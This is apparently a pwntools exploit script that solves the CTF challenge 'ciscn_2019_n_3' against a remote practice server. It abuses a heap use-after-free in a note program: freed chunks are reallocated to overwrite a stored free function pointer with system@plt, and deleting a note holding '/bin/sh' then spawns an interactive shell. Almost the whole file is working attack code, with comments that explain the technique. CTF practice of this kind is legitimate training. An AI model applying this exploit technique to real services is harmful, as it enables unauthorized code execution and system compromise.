from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../ciscn_2019_n_3')

# target = process(elf.path)
target = remote('node4.buuoj.cn', 25963)

'''
// Chunk allocated by Note is of size 14
// sizeof(Note) = 0xC bytes.
typedef struct Note {
  // Two function pointers.
  (void) (func*) print; 
  (void) (func*) free;

  // Data.
  void* data;
} Note;

Remember if there are two malloc one of which is for the struct and the other is for its managed memory writable by user, we can use double free, unlink or heap overflow to control the struct by writable managed memory space.
'''

rec_str_free = elf.sym['rec_str_free']
system = elf.plt['system']


def new_int(index, val):
    target.sendlineafter('CNote > ', '1')
    target.sendlineafter('Index > ', str(index))
    target.sendlineafter('Type > ', '1')
    target.sendlineafter('Value > ', str(val))


def new_str(index, size, content):
    target.sendlineafter('CNote > ', '1')
    target.sendlineafter('Index > ', str(index))
    target.sendlineafter('Type > ', '2')
    target.sendlineafter('Length > ', str(size))
    target.sendlineafter('Value > ', content)


def delete(index):
    target.sendlineafter('CNote > ', '2')
    target.sendlineafter('Index > ', str(index))


def dump(index):
    target.sendlineafter('CNote > ', '3')
    target.sendlineafter('Index > ', str(index))


# We write system plt to free_got. Therefore, when invoking free_str, it will
# call system(str_of_the_note).
new_str(0, 0x20, b'aaaa')
new_str(1, 0x20, b'/bin/sh\x00')
new_str(2, 0x20, b'bbbb')

delete(1)
delete(2)

# UAF. so the previous pointer will point to newly allocated chunks.
payload = b'aaaa' + p32(system)
# Note chunk 1's size is 0xc, so we can contrl chunk 1 by allocating a string
# chunk sized 0xc.
new_str(3, 0xc, payload)
# free_str(chunk 1) => free(chunk_1_str) => system('/bin/sh\x00')
delete(1)

target.interactive()
